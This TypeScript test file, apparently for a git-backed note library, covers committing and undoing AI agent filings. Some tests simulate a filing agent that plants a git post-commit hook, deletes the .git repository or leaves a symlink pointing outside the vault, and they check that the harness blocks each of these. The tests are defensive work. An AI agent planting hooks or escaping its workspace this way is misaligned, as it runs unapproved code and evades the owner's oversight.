  const gitOut = (...args: string[]) => execFileSync("git", args, { cwd: versioned.root, encoding: "utf8" });
  const subjects = () => gitOut("log", "--format=%s").split("\n").filter(Boolean);
  const head = () => gitOut("rev-parse", "HEAD").trim();

  beforeEach(async () => {
    envHome(tmp());
    gitIdentity();
    versioned = await Vault.init(join(tmp(), "versioned"), { git: true });
    librarian = new Librarian(versioned, fakeSettings(), { clock: () => NOW });
  });

  it("commits each filing and returns the commit", async () => {
    const capture = librarian.captureText("Commit me");
    const outcome = await only(librarian.file());
    // What was pending (here: the capture itself) is committed first, on its own, as the owner's.
    expect(subjects()).toEqual([
      `avanzel: file ${capture.id}`,
      `avanzel: owner's changes before file ${capture.id}`,
      "avanzel: new library",
    ]);
    expect(outcome.commit).toBe(head());
    expect(gitOut("status", "--porcelain")).toBe("");
  });

  it("keeps what the owner wrote before a filing when the filing is undone", async () => {
    write(versioned.root, "goals/mine.md", "# My own goal\n");
    appendFileSync(versioned.indexPath, "- [[mine]] — my own goal\n");
    const index = read(versioned.indexPath);
    librarian.captureText("Build a tiny greenhouse");
    const outcome = await only(librarian.file());
    expect(await librarian.undo([outcome.commit ?? ""])).toBe(1);
    expect(read(join(versioned.root, "goals", "mine.md"))).toBe("# My own goal\n");
    expect(read(versioned.indexPath)).toBe(index);
    expect(gitOut("status", "--porcelain")).toBe("");
  });

  it("keeps what the owner wrote before an evening review when all of it is undone", async () => {
    write(versioned.root, "goals/mine.md", "# My own goal\n");
    appendFileSync(versioned.indexPath, "- [[mine]] — my own goal\n");
    const index = read(versioned.indexPath);
    librarian.captureText("one");
    librarian.captureText("two");
    const review = await librarian.eveningReview();
    expect(review.commits).toHaveLength(3);
    expect(await librarian.undo(review.commits)).toBe(3);
    expect(read(join(versioned.root, "goals", "mine.md"))).toBe("# My own goal\n");
    expect(read(versioned.indexPath)).toBe(index);
    expect(gitOut("status", "--porcelain")).toBe("");
  });

  it("never runs a git hook an agent planted", async () => {
    mode("arm");
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(existsSync(join(versioned.root, ".git", "hooks", "post-commit"))).toBe(false);
    expect(existsSync(join(versioned.root, "HOOK_RAN"))).toBe(false);
    expect(subjects()[0]?.startsWith("avanzel: file ")).toBe(true);
  });

  it("hands out what a failed run left behind as its own commit, so undoing the review takes it back", async () => {
    mode("messy"); // the failing run rewrites goals/run.md first
    write(versioned.root, "goals/run.md", "# Run\n");
    const stuck = librarian.captureText("An unfileable thought");
    const fine = librarian.captureText("Build a greenhouse");
    const review = await librarian.eveningReview();
    const [failed, filed] = review.outcomes;
    expect([failed?.captureId, failed?.ok, filed?.captureId, filed?.ok]).toEqual([stuck.id, false, fine.id, true]);
    expect(failed?.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(review.commits).toEqual([failed?.commit, filed?.commit, head()]);
    expect(await librarian.undo(review.commits)).toBe(3);
    expect(read(join(versioned.root, "goals", "run.md"))).toBe("# Run\n");
  });

  it("undoes all of a review even when a failed run edited between two filings", async () => {
    mode("messy"); // the failing run adds a line to index.md
    librarian.captureText("a first thought");
    librarian.captureText("b unfileable thought");
    librarian.captureText("c third thought");
    const index = read(versioned.indexPath);
    const review = await librarian.eveningReview();
    expect(review.outcomes.map((outcome) => outcome.ok)).toEqual([true, false, true]);
    expect(review.commits).toHaveLength(4);
    expect(await librarian.undo(review.commits)).toBe(4);
    expect(read(versioned.indexPath)).toBe(index);
    expect(gitOut("status", "--porcelain")).toBe("");
  });

  it("hands out a cancelled run's leftovers too, and still writes the digest", async () => {
    mode("slow-messy");
    librarian.captureText("Takes forever");
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 500);
    const review = await librarian.eveningReview({ signal: controller.signal });
    const [cancelled] = review.outcomes;
    expect(cancelled?.ok).toBe(false);
    expect(cancelled?.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(review.digestPath).not.toBeNull();
    expect(review.commits).toEqual([cancelled?.commit, head()]);
    expect(await librarian.undo(review.commits)).toBe(2);
    expect(existsSync(join(versioned.root, "goals", "half.md"))).toBe(false);
  });

  it("makes no commit for a failed run that changed nothing", async () => {
    mode("fail");
    const capture = librarian.captureText("Something to keep");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(false);
    expect(outcome.commit).toBeNull();
    expect(subjects()).toEqual([`avanzel: owner's changes before file ${capture.id}`, "avanzel: new library"]);
  });

  it("does not hand git a half-made .git when an agent deletes the repository", async () => {
    // git would take a .git holding only config and hooks for no repository, and commit in a folder above.
    mode("drop-git");
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.commit).toBeNull();
    expect(existsSync(join(versioned.root, ".git"))).toBe(false);
    expect(outcome.guarded).toContain(".git/config");
  });

  it("leaves committing to the owner when auto_commit is off", async () => {
    librarian = new Librarian(versioned, fakeSettings({ autoCommit: false }), { clock: () => NOW });
    librarian.captureText("Do not commit me");
    const outcome = await only(librarian.file());
    expect(outcome.commit).toBeNull();
    expect(subjects()).toEqual(["avanzel: new library"]);
  });

  it("returns every commit of an evening review, the digest last", async () => {
    const one = librarian.captureText("one");
    const two = librarian.captureText("two");
    const review = await librarian.eveningReview();
    expect(subjects().slice(0, 3)).toEqual(["avanzel: evening review 2026-10-20", `avanzel: file ${two.id}`, `avanzel: file ${one.id}`]);
    expect(review.commits).toEqual(gitOut("log", "-3", "--format=%H").trim().split("\n").reverse());
    expect(review.outcomes.map((outcome) => outcome.commit)).toEqual(review.commits.slice(0, 2));
    // the owner's pending changes went into a commit of their own, which is never handed out for undo
    expect(subjects()[3]).toBe(`avanzel: owner's changes before file ${one.id}`);
    expect(review.commits).not.toContain(gitOut("log", "-1", "--skip=3", "--format=%H").trim());
  });

  it("undoes a filing: pages reverted, the capture back in the inbox, waiting captures kept (undo_reverts_filing_commits)", async () => {
    const waiting = librarian.captureText("Waiting for the evening");
    const capture = librarian.captureText("Build a tiny greenhouse");
    const original = read(capture.path);
    const index = read(versioned.indexPath);
    const log = read(versioned.logPath);
    const outcome = await only(librarian.file([capture.path]));
    expect(await librarian.undo([outcome.commit ?? ""])).toBe(1);
    expect(existsSync(join(versioned.root, "ideas", `idea-${capture.id}.md`))).toBe(false);
    expect(existsSync(outcome.archivedTo ?? "")).toBe(false);
    expect(read(versioned.indexPath)).toBe(index);
    expect(read(versioned.logPath)).toBe(log);
    expect(versioned.pending()).toEqual([capture.path, waiting.path]);
    expect(read(capture.path)).toBe(original);
    expect(read(waiting.path)).toContain("Waiting for the evening");
    expect(subjects()[0]).toBe(`avanzel: undo file ${capture.id}`);
    expect(gitOut("status", "--porcelain")).toBe("");
    expect(existsSync(join(versioned.root, ".git", "REVERT_HEAD"))).toBe(false);
  });

  it("undoes a whole evening review, screenshots included", async () => {
    const index = read(versioned.indexPath);
    const log = read(versioned.logPath);
    const shot = librarian.captureScreen({ image: write(tmp(), "shot.png", "PNG"), comment: "Pricing table" });
    const note = librarian.captureText("Call Anna");
    const originals = new Map([shot, note].map((capture) => [capture.path, read(capture.path)]));
    const review = await librarian.eveningReview();
    expect(review.commits).toHaveLength(3);
    expect(await librarian.undo(review.commits)).toBe(3);
    expect(versioned.pending()).toEqual([...originals.keys()].sort());
    for (const [path, text] of originals) expect(read(path)).toBe(text);
    expect(read(join(versioned.raw, "attachments", "2026", "10", "2026-10-20-140312.png"))).toBe("PNG");
    expect(existsSync(review.digestPath ?? "")).toBe(false);
    expect(read(versioned.indexPath)).toBe(index);
    expect(read(versioned.logPath)).toBe(log);
    expect(gitOut("status", "--porcelain")).toBe("");
    // and the library works as before: the same captures file again
    expect((await librarian.file()).map((outcome) => outcome.ok)).toEqual([true, true]);
  });

  it("Undo removes a link a run committed under raw/", async () => {
    // Committed straight with git: a library from before the guard removed such links may hold one.
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    symlinkSync(outside, join(versioned.raw, "2026"));
    const screenshot = write(versioned.root, "raw/attachments/2026/10/2026-10-20-140312.png", "PNG");
    const commit = await git.commitAll(versioned.root, "avanzel: file 2026-10-20-140312-harmless-words");
    expect(await librarian.undo([commit ?? ""])).toBe(1);
    expect(lstatOrNull(join(versioned.raw, "2026"))).toBeNull();
    expect(read(screenshot)).toBe("PNG");
    expect(gitOut("status", "--porcelain")).toBe("");
  });

  it("leaves the library alone when a filing can no longer be undone cleanly", async () => {
    const first = await only(librarian.file([librarian.captureText("first thought").path]));
    await librarian.file([librarian.captureText("second thought").path]); // its log line now follows the first's
    const before = head();
    expect(await librarian.undo([first.commit ?? ""])).toBe(0);
    expect(head()).toBe(before);
    expect(gitOut("status", "--porcelain")).toBe("");
  });
});
